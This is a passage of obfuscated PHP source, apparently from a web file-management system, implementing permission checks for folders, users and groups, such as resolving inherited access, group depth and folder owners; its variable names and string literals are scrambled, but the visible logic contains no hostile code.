$¤ø¤åÊ[$Ñ•€ıÆ«[1979]], $Ñ•€ıÆ«[597] => $¤ø¤åÊ[$Ñ•€ıÆ«[202]], $Ñ•€ıÆ«[2171] => array($ùˆ¬Ó‘)); $¶›§‰¡¹[$ûÅ«ÌíÙ[$Ñ•€ıÆ«[203]]] = $ûÅ«ÌíÙ; } } $ØŠøŸ©Ï = array(); $Í¤ËïÇª = $this->getAllChildren($Ëá†éÉÅ); foreach ($Í¤ËïÇª as $í‰Ôèî´) { $±Õ‹ëéÙ = !1; foreach ($í‰Ôèî´[$Ñ•€ıÆ«[2171]] as $»çÂ¥‚ß) { if ($»çÂ¥‚ß[$Ñ•€ıÆ«[1778]]) { if ($»çÂ¥‚ß[$Ñ•€ıÆ«[1778]] == $ÄÏ®ìÍ¤) { $±Õ‹ëéÙ = !0; break; } } if ($»çÂ¥‚ß[$Ñ•€ıÆ«[1979]]) { if ($this->groupContainUser($»çÂ¥‚ß[$Ñ•€ıÆ«[1979]], $ÄÏ®ìÍ¤)) { $±Õ‹ëéÙ = !0; break; } } } if ($±Õ‹ëéÙ) { $ØŠøŸ©Ï[] = $í‰Ôèî´; } $ İ·áøä = $í‰Ôèî´[$Ñ•€ıÆ«[203]]; if (isset($¶›§‰¡¹[$ İ·áøä])) { $í‰Ôèî´[$Ñ•€ıÆ«[2171]][] = $¶›§‰¡¹[$ İ·áøä][0]; $¶›§‰¡¹[$ İ·áøä] = !1; } } $¶›§‰¡¹ = array_filter(array_values($¶›§‰¡¹)); $ØŠøŸ©Ï = array_merge($¶›§‰¡¹, $ØŠøŸ©Ï); return $ØŠøŸ©Ï; } public function setAllChildrenByUser($ƒÏ‚ùó¡, $†ôŸÉà, $ÃëÚÀ©è) { $„àª­Õ =& $_SERVER[¼èá¯æÙ]; $·ÚƒÉå… = $this->getAllChildrenByUser($ƒÏ‚ùó¡, $†ôŸÉà); if (!$ÃëÚÀ©è || !$·ÚƒÉå…) { return !1; } foreach ($·ÚƒÉå… as $¬ç§Üß²) { $Ïüç›ÁÉ = array(); foreach ($¬ç§Üß²[$„àª­Õ[2171]] as $Äç›è¶û) { $À¦İıš¯ = $Äç›è¶û[$„àª­Õ[551]]; $Ó®÷ï“² = $Äç›è¶û[$„àª­Õ[1778]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¾Ğ¥†Í = $Äç›è¶û[$„àª­Õ[1778]] ? $Äç›è¶û[$„àª­Õ[1778]] : $Äç›è¶û[$„àª­Õ[1979]]; if ($Äç›è¶û[$„àª­Õ[1778]] && $Äç›è¶û[$„àª­Õ[1778]] == $†ôŸÉà) { continue; } $Ïüç›ÁÉ[] = array($„àª­Õ[203] => $¬ç§Üß²[$„àª­Õ[203]], $„àª­Õ[200] => $Ó®÷ï“², $„àª­Õ[580] => intval($¾Ğ¥†Í), $„àª­Õ[2087] => isset($À¦İıš¯[$„àª­Õ[486]]) ? intval($À¦İıš¯[$„àª­Õ[486]]) : 0, $„àª­Õ[2151] => isset($À¦İıš¯[$„àª­Õ[2151]]) ? intval($À¦İıš¯[$„àª­Õ[2151]]) : -1); } $Ïüç›ÁÉ[] = array($„àª­Õ[203] => $¬ç§Üß²[$„àª­Õ[203]], $„àª­Õ[200] => SourceModel::TYPE_USER, $„àª­Õ[580] => intval($†ôŸÉà), $„àª­Õ[2087] => intval($ÃëÚÀ©è), $„àª­Õ[2151] => -1); $this->where(array($„àª­Õ[502] => $¬ç§Üß²[$„àª­Õ[203]]))->delete(); $this->addAll($Ïüç›ÁÉ); } return !0; } public function get($àöåÁ—Ë) { $§¦¡§ôø = $this->getSourceList(array($àöåÁ—Ë), !0); return $§¦¡§ôø[0]; } public function getSourceList($Ú„ÛÌ•, $ø¦ù»¯¦ = false, $…·¿¶ËÕ = false) { $³Ùü©Êí =& $_SERVER[¼èá¯æÙ]; if (!$Ú„ÛÌ•) { return array(); } $ö“ªÇ¢Ã = Model($³Ùü©Êí[1426]); if (!$ø¦ù»¯¦ && count($Ú„ÛÌ•) == 1) { $ø¦ù»¯¦ = array(); $ø¦ù»¯¦[$Ú„ÛÌ•[0]] = $ö“ªÇ¢Ã->sourceInfo($Ú„ÛÌ•[0]); } if (!$ø¦ù»¯¦) { $ú·–Ã® = array($³Ùü©Êí[502] => array($³Ùü©Êí[503], $Ú„ÛÌ•)); $ø¦ù»¯¦ = $ö“ªÇ¢Ã->field($³Ùü©Êí[2175])->where($ú·–Ã®)->select(); $ø¦ù»¯¦ = array_to_keyvalue($ø¦ù»¯¦, $³Ùü©Êí[203]); } $ï±…Ôæù = $Ú„ÛÌ•; foreach ($ø¦ù»¯¦ as $öı¶Ü÷­ => $ƒ‹Šø„) { $ŞÏğÀ˜… = $ö“ªÇ¢Ã->parentLevelArray($ƒ‹Šø„[$³Ùü©Êí[595]]); $ï±…Ôæù = array_merge($ï±…Ôæù, array($öı¶Ü÷­), array_reverse($ŞÏğÀ˜…)); } $ï±…Ôæù = array_values(array_unique($ï±…Ôæù)); if (!$ï±…Ôæù) { return array(); } $ç µÊ¸İ = $this->sourceAuthSelect($ï±…Ôæù); $†´§‹¸ = array(); foreach ($ï±…Ôæù as $Å·ç³¤¯) { if (isset($ç µÊ¸İ[$Å·ç³¤¯])) { $†´§‹¸[$Å·ç³¤¯] = $ç µÊ¸İ[$Å·ç³¤¯]; } } $ã°ªŸ¶ï = $this->userIsRoot($…·¿¶ËÕ); $ì¥˜Åäò = AuthModel::authAll(); $Ìˆñ¯Ÿ = array($³Ùü©Êí[499] => $ì¥˜Åäò, $³Ùü©Êí[2176] => array($³Ùü©Êí[504] => 0, $³Ùü©Êí[1985] => $ì¥˜Åäò, $³Ùü©Êí[505] => LNG($³Ùü©Êí[2177]), $³Ùü©Êí[2002] => $³Ùü©Êí[2178])); $¶­Â¼Ÿ = array(); foreach ($ø¦ù»¯¦ as $Å·ç³¤¯ => $‹ÚÌÒ³) { if ($ã°ªŸ¶ï && $GLOBALS[$³Ùü©Êí[6]][$³Ùü©Êí[1998]]) { $¶­Â¼Ÿ[$Å·ç³¤¯] = $Ìˆñ¯Ÿ; continue; } $¶­Â¼Ÿ[$Å·ç³¤¯] = $this->makeSourceAuth($‹ÚÌÒ³, $†´§‹¸, $…·¿¶ËÕ); } return $¶­Â¼Ÿ; } public function authDeepCheck($şÛ“à‚Ğ, $œı÷ñà = false) { $ì½ªğ =& $_SERVER[¼èá¯æÙ]; $œı÷ñà = $œı÷ñà ? $œı÷ñà : USER_ID; $¢‚²™Ä = $this->makeAuthDeep($œı÷ñà); if (!in_array($şÛ“à‚Ğ, $¢‚²™Ä[$ì½ªğ[2179]])) { return !1; } $èÚ°Êú¬ = array(); foreach ($¢‚²™Ä[$ì½ªğ[2180]] as $Øıë¤ğØ => $ã‘ÁÃÔÁ) { if (!in_array($şÛ“à‚Ğ, $ã‘ÁÃÔÁ)) { continue; } $èÚ°Êú¬[] = $Øıë¤ğØ; } if (!$èÚ°Êú¬) { return !1; } $¢à¦ÃÁ† = $èÚ°Êú¬ ? $èÚ°Êú¬[0] : $şÛ“à‚Ğ; return array($ì½ªğ[499] => -1, $ì½ªğ[551] => array($ì½ªğ[504] => $ì½ªğ[1278], $ì½ªğ[1985] => $ì½ªğ[240], $ì½ªğ[505] => LNG($ì½ªğ[2181]), $ì½ªğ[2002] => $ì½ªğ[2182]), $ì½ªğ[2183] => LNG($ì½ªğ[2184]), $ì½ªğ[2185] => $this->sourceAuthInfo($¢à¦ÃÁ†)); } protected function makeAuthDeep($–âÛ š™ = false) { $Ó¼ïñÍÏ =& $_SERVER[¼èá¯æÙ]; static $ï×Ğûñ­ = array(); $–âÛ š™ = $–âÛ š™ ? $–âÛ š™ : USER_ID; if (isset($ï×Ğûñ­[$–âÛ š™])) { return $ï×Ğûñ­[$–âÛ š™]; } $ Ü¡´Ö = Model($Ó¼ïñÍÏ[2186])->listData(); $¸‚¡Ö¥” = array(); foreach ($ Ü¡´Ö as $èœˆüğ) { if ($èœˆüğ[$Ó¼ïñÍÏ[498]] == 0 && $èœˆüğ[$Ó¼ïñÍÏ[2001]] == $Ó¼ïñÍÏ[101]) { $¸‚¡Ö¥”[] = $èœˆüğ[$Ó¼ïñÍÏ[486]]; } } $ƒÍÑ¡Ò = $this->userGroupParents($–âÛ š™); $†«‡øù© = array($Ó¼ïñÍÏ[200] => SourceModel::TYPE_USER, $Ó¼ïñÍÏ[580] => $–âÛ š™); if ($ƒÍÑ¡Ò) { $†«‡øù© = array(array($Ó¼ïñÍÏ[200] => SourceModel::TYPE_USER, $Ó¼ïñÍÏ[580] => $–âÛ š™), array($Ó¼ïñÍÏ[200] => SourceModel::TYPE_GROUP, $Ó¼ïñÍÏ[580] => array($Ó¼ïñÍÏ[503], $ƒÍÑ¡Ò)), $Ó¼ïñÍÏ[1082] => $Ó¼ïñÍÏ[2081]); } $úìšÎÌó = $this->field($Ó¼ïñÍÏ[2187])->where($†«‡øù©)->select(); $éßßÓ™‰ = array(); $¢µÂÅğ = array_to_keyvalue_group($úìšÎÌó, $Ó¼ïñÍÏ[203]); foreach ($¢µÂÅğ as $éœêóãì => $ÇŸŠ¹Ò) { $ÎÊ¹£’ = $this->authArrayCheck($ÇŸŠ¹Ò, $–âÛ š™); if ($ÎÊ¹£’[$Ó¼ïñÍÏ[499]] > 0) { $éßßÓ™‰[] = $éœêóãì . $Ó¼ïñÍÏ[12]; } } if ($ƒÍÑ¡Ò) { $íê°½ÏË = Model($Ó¼ïñÍÏ[596]); foreach ($ƒÍÑ¡Ò as $–²§ªï) { $âÆœ—¿Ë = $íê°½ÏË->getInfo($–²§ªï); if (!$âÆœ—¿Ë || !is_array($âÆœ—¿Ë[$Ó¼ïñÍÏ[100]])) { continue; } $éßßÓ™‰[] = $âÆœ—¿Ë[$Ó¼ïñÍÏ[100]][$Ó¼ïñÍÏ[203]]; } } $ºçÂ»İ = array(); $×Ö²‡ê² = $ƒÍÑ¡Ò; $Ïî´Ÿä = Model($Ó¼ïñÍÏ[1426]); $íê°½ÏË = Model($Ó¼ïñÍÏ[596]); $ü°ªÜ² = array(); $Î¾Ç’ = array(); $×ÒÅû±Œ = array(); $­ü¼¥ÌÈ = array(); if ($éßßÓ™‰) { $€¤ğÚí¦ = $Ïî´Ÿä->where(array($Ó¼ïñÍÏ[203] => array($Ó¼ïñÍÏ[503], $éßßÓ™‰)))->select(); foreach ($€¤ğÚí¦ as $¥îæÎŞû) { if ($¥îæÎŞû[$Ó¼ïñÍÏ[516]] == $Ó¼ïñÍÏ[101]) { continue; } $Îİ«Û†Ù = $Ïî´Ÿä->parentLevelArray($¥îæÎŞû[$Ó¼ïñÍÏ[595]]); $ºçÂ»İ = array_merge($ºçÂ»İ, $Îİ«Û†Ù); $×Ö²‡ê²[] = $¥îæÎŞû[$Ó¼ïñÍÏ[580]]; $ü°ªÜ²[$¥îæÎŞû[$Ó¼ïñÍÏ[203]]] = $Îİ«Û†Ù; $Î¾Ç’[$¥îæÎŞû[$Ó¼ïñÍÏ[203]]] = $¥îæÎŞû[$Ó¼ïñÍÏ[580]]; } } $×Ö²‡ê² = array_values(array_unique($×Ö²‡ê²)); $½˜†£“ˆ = $×Ö²‡ê²; foreach ($½˜†£“ˆ as $–²§ªï) { $âÆœ—¿Ë = $íê°½ÏË->getInfo($–²§ªï); $Îİ«Û†Ù = $Ïî´Ÿä->parentLevelArray($âÆœ—¿Ë[$Ó¼ïñÍÏ[595]]); $×Ö²‡ê² = array_merge($×Ö²‡ê², $Îİ«Û†Ù); } $×Ö²‡ê² = array_values(array_unique($×Ö²‡ê²)); foreach ($×Ö²‡ê² as $–²§ªï) { $âÆœ—¿Ë = $íê°½ÏË->getInfo($–²§ªï); $ºçÂ»İ[] = $âÆœ—¿Ë[$Ó¼ïñÍÏ[100]][$Ó¼ïñÍÏ[203]]; $×ÒÅû±Œ[$–²§ªï] = $âÆœ—¿Ë[$Ó¼ïñÍÏ[100]][$Ó¼ïñÍÏ[203]]; $­ü¼¥ÌÈ[$–²§ªï] = $Ïî´Ÿä->parentLevelArray($âÆœ—¿Ë[$Ó¼ïñÍÏ[595]]); } foreach ($ü°ªÜ² as $¨İƒÂ³ª => $«ë»×Â£) { $ˆÀÛüŒ… = $Î¾Ç’[$¨İƒÂ³ª]; if (!$ˆÀÛüŒ… || !$×ÒÅû±Œ[$ˆÀÛüŒ…]) { continue; } $ıÍÄÈ³ö = array(); foreach ($­ü¼¥ÌÈ[$ˆÀÛüŒ…] as $–²§ªï) { $ıÍÄÈ³ö[] = $×ÒÅû±Œ[$–²§ªï]; } $ü°ªÜ²[$¨İƒÂ³ª] = array_merge($ıÍÄÈ³ö, $«ë»×Â£); } $ºçÂ»İ = array_values(array_unique($ºçÂ»İ)); $†å¿‘Æ = array($Ó¼ïñÍÏ[2179] => $ºçÂ»İ, $Ó¼ïñÍÏ[2180] => $ü°ªÜ²); $ï×Ğûñ­[$–âÛ š™] = $†å¿‘Æ; return $†å¿‘Æ; } private function makeSourceAuth($·œî†¤´, $ÖÛ¶Äô“, $¶½›£æ‰ = false) { $÷°„ˆïƒ =& $_SERVER[¼èá¯æÙ]; $¯½Ä—…¾ = $÷°„ˆïƒ[101]; $¸î°™Ø = $·œî†¤´[$÷°„ˆïƒ[580]]; $ò‰±ôÉ = $·œî†¤´[$÷°„ˆïƒ[200]] == SourceModel::TYPE_GROUP; $¾£­«×ˆ = $ò‰±ôÉ ? $this->groupRootAuth($¸î°™Ø, $¶½›£æ‰) : !1; if ($¾£­«×ˆ && Model($÷°„ˆïƒ[582])->authCheckAction($¾£­«×ˆ[$÷°„ˆïƒ[498]], $÷°„ˆïƒ[2000])) { return $this->groupAuthInfo($¾£­«×ˆ, $¸î°™Ø); } $Ÿ§¹Ï€ = Model($÷°„ˆïƒ[1426])->parentLevelArray($·œî†¤´[$÷°„ˆïƒ[595]]); $Ÿ§¹Ï€ = array_merge(array($·œî†¤´[$÷°„ˆïƒ[203]]), array_reverse($Ÿ§¹Ï€)); $à¸Øïí = !1; foreach ($Ÿ§¹Ï€ as $œŒÈÂ÷Ì) { if (!isset($ÖÛ¶Äô“[$œŒÈÂ÷Ì])) { continue; } $ø¹¿úó = $this->authMake($ÖÛ¶Äô“[$œŒÈÂ÷Ì], $¶½›£æ‰); if ($ø¹¿úó[$÷°„ˆïƒ[551]]) { $à¸Øïí = $ø¹¿úó; break; } } if (!$ò‰±ôÉ) { return $à¸Øïí; } if (!$à¸Øïí && $¾£­«×ˆ) { $à¸Øïí = $this->groupAuthInfo($¾£­«×ˆ, $¸î°™Ø); } if (!$à¸Øïí) { $½Ôœô¨Á = Model($÷°„ˆïƒ[596])->getInfo($¸î°™Ø); $”¿§·ã = explode($÷°„ˆïƒ[50], trim($½Ôœô¨Á[$÷°„ˆïƒ[595]], $÷°„ˆïƒ[50])); $”¿§·ã = array_reverse($”¿§·ã); foreach ($”¿§·ã as $àûğÍ²Ó) { if ($àûğÍ²Ó == $÷°„ˆïƒ[240] || $àûğÍ²Ó == $¯½Ä—…¾) { continue; } $â¨ôŞš = $this->groupRootAuth($àûğÍ²Ó, $¶½›£æ‰); if (!$â¨ôŞš) { continue; } $à¸Øïí = $this->groupAuthInfo($â¨ôŞš, $àûğÍ²Ó); break; } } if (!$à¸Øïí || $à¸Øïí[$÷°„ˆïƒ[499]] <= 0) { $ØÆşˆş— = $this->authDeepCheck($·œî†¤´[$÷°„ˆïƒ[203]], $¶½›£æ‰); if ($ØÆşˆş—) { $à¸Øïí = $ØÆşˆş—; } } return $à¸Øïí; } private function userIsRoot($ÅûõÚŞÄ = false) { $éúôÄØ½ =& $_SERVER[¼èá¯æÙ]; if (!$ÅûõÚŞÄ && KodUser::isRoot()) { return !0; } $ĞòîóÊò = Model($éúôÄØ½[608])->getInfo($ÅûõÚŞÄ); $²©æ­ É = Model($éúôÄØ½[2188])->listData($ĞòîóÊò[$éúôÄØ½[2189]]); if ($²©æ­ É && $²©æ­ É[$éúôÄØ½[586]][$éúôÄØ½[2190]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¹¡ô”È–) { $™ÙîşÌ =& $_SERVER[¼èá¯æÙ]; $®ìäí¼× = Model($™ÙîşÌ[1426]); $Î¡­º¾ = $®ìäí¼×->sourceInfo($¹¡ô”È–); if (!$Î¡­º¾) { return !1; } $®ìäí¼×->groupPathDisplay($Î¡­º¾); $ôšãí¿ô = array($Î¡­º¾); $ôšãí¿ô = $®ìäí¼×->_listAppendPath($ôšãí¿ô); $Î¡­º¾ = $ôšãí¿ô[0]; $ò ÒÑşŞ = $Î¡­º¾[$™ÙîşÌ[593]]; if (isset($Î¡­º¾[$™ÙîşÌ[601]])) { $§«ÜÚÒ¤ = explode($™ÙîşÌ[8], trim($Î¡­º¾[$™ÙîşÌ[593]], $™ÙîşÌ[8])); array_shift($§«ÜÚÒ¤); $ò ÒÑşŞ = $Î¡­º¾[$™ÙîşÌ[599]] . $™ÙîşÌ[2191] . implode($™ÙîşÌ[8], $§«ÜÚÒ¤); } return array($™ÙîşÌ[505] => $Î¡­º¾[$™ÙîşÌ[32]], $™ÙîşÌ[97] => KodIO::make($Î¡­º¾[$™ÙîşÌ[203]]), $™ÙîşÌ[2192] => $ò ÒÑşŞ); } private function groupAuthInfo($Ğ¸ìîÛ, $Ìé¸ìö®) { $Ç™Ñ¶Œ€ =& $_SERVER[¼èá¯æÙ]; $ş™•½îí = Model($Ç™Ñ¶Œ€[596])->getInfo($Ìé¸ìö®); return array($Ç™Ñ¶Œ€[2193] => intval($Ğ¸ìîÛ[$Ç™Ñ¶Œ€[498]]), $Ç™Ñ¶Œ€[2176] => $Ğ¸ìîÛ, $Ç™Ñ¶Œ€[2194] => LNG($Ç™Ñ¶Œ€[2195]), $Ç™Ñ¶Œ€[2185] => array($Ç™Ñ¶Œ€[505] => $ş™•½îí[$Ç™Ñ¶Œ€[32]], $Ç™Ñ¶Œ€[97] => KodIO::make($ş™•½îí[$Ç™Ñ¶Œ€[100]][$Ç™Ñ¶Œ€[203]]), $Ç™Ñ¶Œ€[2192] => $ş™•½îí[$Ç™Ñ¶Œ€[600]])); } protected function groupRootAuth($˜‰øà‡…, $»¯³„–ß = false) { $èùÁ½š =& $_SERVER[¼èá¯æÙ]; $»¯³„–ß = $»¯³„–ß ? $»¯³„–ß : USER_ID; $—òÉ‹¯¢ = $»¯³„–ß . $èùÁ½š[2196] . $˜‰øà‡…; static $ß¦ÌãÑ = array(); if (isset($ß¦ÌãÑ[$—òÉ‹¯¢])) { return $ß¦ÌãÑ[$—òÉ‹¯¢]; } $ƒéñÎîœ = Model($èùÁ½š[596])->getInfo($˜‰øà‡…); $”üÖÕÅá = $this->userGroupList($»¯³„–ß); $ë×œœñ = isset($”üÖÕÅá[$˜‰øà‡…]) ? $”üÖÕÅá[$˜‰øà‡…][$èùÁ½š[498]] : !1; if ($ë×œœñ && Model($èùÁ½š[582])->authCheckAction($ë×œœñ[$èùÁ½š[498]], $èùÁ½š[2000])) { $ß¦ÌãÑ[$—òÉ‹¯¢] = $ë×œœñ; return $ë×œœñ; } $ƒÚã­™ = $this->sourceAuthSelect($ƒéñÎîœ[$èùÁ½š[100]][$èùÁ½š[203]]); $¾ºÙƒ©Ã = $ƒÚã­™ ? $this->authMake($ƒÚã­™, $»¯³„–ß) : !1; $ğ›È´úõ = $¾ºÙƒ©Ã ? $¾ºÙƒ©Ã[$èùÁ½š[551]] : !1; $ß¦ÌãÑ[$—òÉ‹¯¢] = $ğ›È´úõ ? $ğ›È´úõ : $ë×œœñ; return $ß¦ÌãÑ[$—òÉ‹¯¢]; } public function authOwnerApply($ÖÇï–©é) { $çŸˆé¯• =& $_SERVER[¼èá¯æÙ]; if (empty($ÖÇï–©é[$çŸˆé¯•[498]]) || isset($ÖÇï–©é[$çŸˆé¯•[2197]]) && $ÖÇï–©é[$çŸˆé¯•[2197]]) { return $ÖÇï–©é; } if (AuthModel::authCheckRoot($ÖÇï–©é[$çŸˆé¯•[498]][$çŸˆé¯•[499]])) { return $ÖÇï–©é; } $õÕíø·È = Model($çŸˆé¯•[1426])->parentLevelArray($ÖÇï–©é[$çŸˆé¯•[595]]); $õÕíø·È = array_merge(array($ÖÇï–©é[$çŸˆé¯•[203]]), array_reverse($õÕíø·È)); $Æç¤†œÍ = $this->sourceAuthSelect($õÕíø·È); $„ƒï­ˆ¹ = array(); $§¨õÁ·” = array(); foreach ($Æç¤†œÍ as $õ×ü­Í => $³ßÁÙ) { $—è­´åæ = $this->authFolderOwnerUser($³ßÁÙ); $„ƒï­ˆ¹[$õ×ü­Í] = $—è­´åæ; $§¨õÁ·” = array_merge($§¨õÁ·”, $—è­´åæ[$çŸˆé¯•[676]]); if ($—è­´åæ[$çŸˆé¯•[2198]]) { break; } } if (count($§¨õÁ·”) == 0) { $§¨õÁ·” = $this->authFolderOwnerGroup($ÖÇï–©é[$çŸˆé¯•[580]]); } $§¨õÁ·” = array_unique($§¨õÁ·”); if (AuthModel::authCheckRoot($ÖÇï–©é[$çŸˆé¯•[498]][$çŸˆé¯•[499]])) { $§¨õÁ·”[] = USER_ID; } $ÖÇï–©é[$çŸˆé¯•[498]][$çŸˆé¯•[2199]] = Model($çŸˆé¯•[588])->userListInfo($§¨õÁ·”); return $ÖÇï–©é; } private function authFolderOwnerGroup($°ıè§¬) { $Âå‰Õ =& $_SERVER[¼èá¯æÙ]; $Â°ÜÜí = Model($Âå‰Õ[2073])->where(array($Âå‰Õ[1979] => $°ıè§¬))->select(); $ÙúüÜĞë = array(); if (!$Â°ÜÜí) { return $ÙúüÜĞë; } foreach ($Â°ÜÜí as $Æ™Ÿ—â) { $ìÀªæ½¨ = $this->authInfo($Æ™Ÿ—â); if (AuthModel::authCheckRoot($ìÀªæ½¨[$Âå‰Õ[498]])) { $ÙúüÜĞë[] = $Æ™Ÿ—â[$Âå‰Õ[1778]]; } } return $ÙúüÜĞë; } private function authFolderOwnerUser($Ï°ŞŠù) { $ôûèéàú =& $_SERVER[¼èá¯æÙ]; $éƒä¸àı = array(); $ÖÚñãÓ„ = !1; foreach ($Ï°ŞŠù as $úß Ù¾“) { $ü­ãÛå» = $this->authInfo($úß Ù¾“); if ($úß Ù¾“[$ôûèéàú[580]] == $ôûèéàú[240]) { $ÖÚñãÓ„ = !0; } if ($úß Ù¾“[$ôûèéàú[200]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ü­ãÛå»[$ôûèéàú[498]])) { $éƒä¸àı[] = $úß Ù¾“[$ôûèéàú[580]]; } } } return array($ôûèéàú[676] => $éƒä¸àı, $ôûèéàú[2198] => $ÖÚñãÓ„); } public function authMake($ˆÓÇÂ°ª, $†üÅ‰½ä = false) { $‡‹œ–‡ =& $_SERVER[¼èá¯æÙ]; $¤“€È¿¥ = $this->authArrayCheck($ˆÓÇÂ°ª, $†üÅ‰½ä); if ($¤“€È¿¥[$‡‹œ–‡[2200]]) { $¤“€È¿¥[$‡‹œ–‡[2200]] = $this->sourceAuthInfo($¤“€È¿¥[$‡‹œ–‡[2200]]); } return $¤“€È¿¥; } public function authArrayCheck($Ê®öÔ, $àÆ¾†— = false) { $±òÌ‹İÍ =& $_SERVER[¼èá¯æÙ]; if (!$Ê®öÔ) { return array($±òÌ‹İÍ[499] => 0, $±òÌ‹İÍ[551] => !1); } $àÆ¾†— = $àÆ¾†— ? $àÆ¾†— : USER_ID; $“‹€Ÿµ¦ = 0; $¶º—â¥¨ = 0; $ì•¢Ü‘ = 0; $‹€´ä¥ß = 0; $şÌçƒÉê = 0; $—‘ÂŠ¹ö = 0; $Ç«ğŠ”— = 1000; $±ø€¡à = 0; $ÍÂ¬„»ı = 0; $ë’£Äíƒ = 0; $üîõ³‘ = 0; $ü¾Àœš¡ = array($±òÌ‹İÍ[203] => 0); foreach ($Ê®öÔ as $ü¾Àœš¡) { $ÊáØ¢† = $this->authInfo($ü¾Àœš¡); if (!$ÊáØ¢†) { continue; } $ıäü©Ë = $ü¾Àœš¡[$±òÌ‹İÍ[580]]; $¥Ë…Åª = intval($ÊáØ¢†[$±òÌ‹İÍ[498]]); if ($ü¾Àœš¡[$±òÌ‹İÍ[200]] == SourceModel::TYPE_USER && $ıäü©Ë == $àÆ¾†—) { $“‹€Ÿµ¦ = !0; $ì•¢Ü‘ = $ÊáØ¢†; $¶º—â¥¨ = $¥Ë…Åª; } else { if ($ü¾Àœš¡[$±òÌ‹İÍ[200]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ıäü©Ë, $àÆ¾†—)) { $‹€´ä¥ß = !0; $œÎ‡¿› = $this->groupStepToUserGroup($ıäü©Ë, $àÆ¾†—); if ($œÎ‡¿› < $Ç«ğŠ”—) { $Ç«ğŠ”— = $œÎ‡¿›; $şÌçƒÉê = $¥Ë…Åª; $—‘ÂŠ¹ö = $ÊáØ¢†; $±ø€¡à = $ıäü©Ë; } if ($œÎ‡¿› == $Ç«ğŠ”— && $¥Ë…Åª >= $şÌçƒÉê) { $şÌçƒÉê = $¥Ë…Åª; $—‘ÂŠ¹ö = $ÊáØ¢†; $±ø€¡à = $ıäü©Ë; } } else { if ($ıäü©Ë == $±òÌ‹İÍ[240]) { $ÍÂ¬„»ı = !0; $üîõ³‘ = $ÊáØ¢†; $ë’£Äíƒ = $¥Ë…Åª; } } } } if ($“‹€Ÿµ¦) { $ñÍÜğÇì = $¶º—â¥¨; $ÊáØ¢† = $ì•¢Ü‘; $ò»¨ö = LNG($±òÌ‹İÍ[2201]); } else { if ($‹€´ä¥ß) { $ñÍÜğÇì = $şÌçƒÉê; $ÊáØ¢† = $—‘ÂŠ¹ö; $ÓÓˆæ¢§ = Model($±òÌ‹İÍ[596])->getInfo($±ø€¡à); $ò»¨ö = $±òÌ‹İÍ[186] . $ÓÓˆæ¢§[$±òÌ‹İÍ[600]] . $±òÌ‹İÍ[2202] . LNG($±òÌ‹İÍ[2203]); } else { if ($ÍÂ¬„»ı) { $ñÍÜğÇì = $ë’£Äíƒ; $ÊáØ¢† = $üîõ³‘; $ò»¨ö = LNG($±òÌ‹İÍ[2173]); } else { $ñÍÜğÇì = 0; $ÊáØ¢† = !1; $ò»¨ö = $±òÌ‹İÍ[12]; } } } $¥Î™‘Ÿ” = array($±òÌ‹İÍ[2193] => intval($ñÍÜğÇì), $±òÌ‹İÍ[2176] => $ÊáØ¢†, $±òÌ‹İÍ[2194] => $ò»¨ö, $±òÌ‹İÍ[2185] => $ü¾Àœš¡[$±òÌ‹İÍ[203]]); return $¥Î™‘Ÿ”; } private function groupContainUser($à¨ÒÜ¿, $óØ£ŞÚª = false) { return in_array($à¨ÒÜ¿, $this->userGroupParents($óØ£ŞÚª)); } private function groupStepToUserGroup($á¸ÏŠÓŒ, $Ö±üï¿õ = false) { $ÑàÑÕ¿ =& $_SERVER[¼èá¯æÙ]; $âŒşà²Õ = $this->userGroupList($Ö±üï¿õ); $ÁÎÃ¹¦ã = 1000; $°ÛŒú•Á = $GLOBALS[$ÑàÑÕ¿[6]][$ÑàÑÕ¿[102]][$ÑàÑÕ¿[2086]] == 1; $Ì¡Í§íÚ = $°ÛŒú•Á ? 3 : 2; foreach ($âŒşà²Õ as $ã‘û€„Û) { if ($ã‘û€„Û[$ÑàÑÕ¿[1979]] == $á¸ÏŠÓŒ) { return 0; } $øËåñ¥Ì = explode($ÑàÑÕ¿[50], trim($ã‘û€„Û[$ÑàÑÕ¿[595]], $ÑàÑÕ¿[50])); if ($øËåñ¥Ì[0] == $ÑàÑÕ¿[240] && count($øËåñ¥Ì) > $Ì¡Í§íÚ) { $´¶ñÒÉ¸ = array_reverse(array_slice($øËåñ¥Ì, $Ì¡Í§íÚ)); $¢È£ØñÉ = array_search($á¸ÏŠÓŒ, $´¶ñÒÉ¸); if ($¢È£ØñÉ !== !1 && $¢È£ØñÉ + 1 <= $ÁÎÃ¹¦ã) { $ÁÎÃ¹¦ã = $¢È£ØñÉ + 1; } } } return $ÁÎÃ¹¦ã; } private function userGroupList($é±Ä‚ = false) { $¬£å–Êˆ =& $_SERVER[¼èá¯æÙ]; static $Ù–åˆà = array(); if (isset($Ù–åˆà[$é±Ä‚])) { return $Ù–åˆà[$é±Ä‚]; } $á¬©ÇŠ¨ = Model($¬£å–Êˆ[608])->getInfo($é±Ä‚); $Ù–åˆà[$é±Ä‚] = array_to_keyvalue($á¬©ÇŠ¨[$¬£å–Êˆ[2174]], $¬£å–Êˆ[1979]); return $Ù–åˆà[$é±Ä‚]; } public function userGroupParents($ÄÆóˆ‹¸) { $”±ÍĞ¸ =& $_SERVER[¼èá¯æÙ]; static $²Œô®¿ = array(); $ÄÆóˆ‹¸ = $ÄÆóˆ‹¸ ? $ÄÆóˆ‹¸ : USER_ID; if (isset($²Œô®¿[$ÄÆóˆ‹¸])) { return $²Œô®¿[$ÄÆóˆ‹¸]; } $ß‹æÅ¨« = $this->userGroupList($ÄÆóˆ‹¸); $­¢ıã¼  = array(); $ÉûŠÒ†ƒ = $GLOBALS[$”±ÍĞ¸[6]][$”±ÍĞ¸[102]][$”±ÍĞ¸[2086]] == 1; $¥éÆôÑ = $ÉûŠÒ†ƒ ? 3 : 2; foreach ($ß‹æÅ¨« as $é­‹±šÁ) { $‚ Öë›ã = array($é­‹±šÁ[$”±ÍĞ¸[1979]]); $šğŸÍÓ = explode($”±ÍĞ¸[50], trim($é­‹±šÁ[$”±ÍĞ¸[595]], $”±ÍĞ¸[50])); if ($šğŸÍÓ[0] == $”±ÍĞ¸[240] && count($šğŸÍÓ) > $¥éÆôÑ) { $»ÇíæØ÷ = array_slice($šğŸÍÓ, $¥éÆôÑ); $‚ Öë›ã = array_merge($‚ Öë›ã, array_reverse($»ÇíæØ÷)); } $­¢ıã¼  = 